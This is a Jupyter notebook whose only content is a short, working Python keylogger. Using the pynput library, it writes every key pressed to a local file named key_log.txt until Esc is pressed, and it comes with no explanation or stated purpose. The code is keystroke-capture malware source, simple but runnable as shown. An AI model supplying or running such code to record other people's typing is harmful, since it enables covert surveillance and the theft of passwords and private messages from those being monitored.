{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4025bea2-8e6e-4a20-ad39-739447a2f239",
   "metadata": {},
   "outputs": [],
   "source": [
    "import pynput\n",
    "from pynput.keyboard import Key, Listener\n",
    "\n",
    "log_file = \"key_log.txt\"\n",
    "\n",
    "def on_press(key):\n",
    "    with open(log_file, \"a\") as log:\n",
    "        try:\n",
    "            log.write(f\"{key.char}\\n\")\n",
    "        except AttributeError:\n",
    "            log.write(f\"{key}\\n\")\n",
    "\n",
    "def on_release(key):\n",
    "    if key == Key.esc:\n",
    "        # Stop listener\n",
    "        return False\n",
    "\n",
    "# Collect events until released\n",
    "with Listener(on_press=on_press, on_release=on_release) as listener:\n",
    "    listener.join()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fb2451bd-bd65-4365-a214-d7a379b84e6e",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
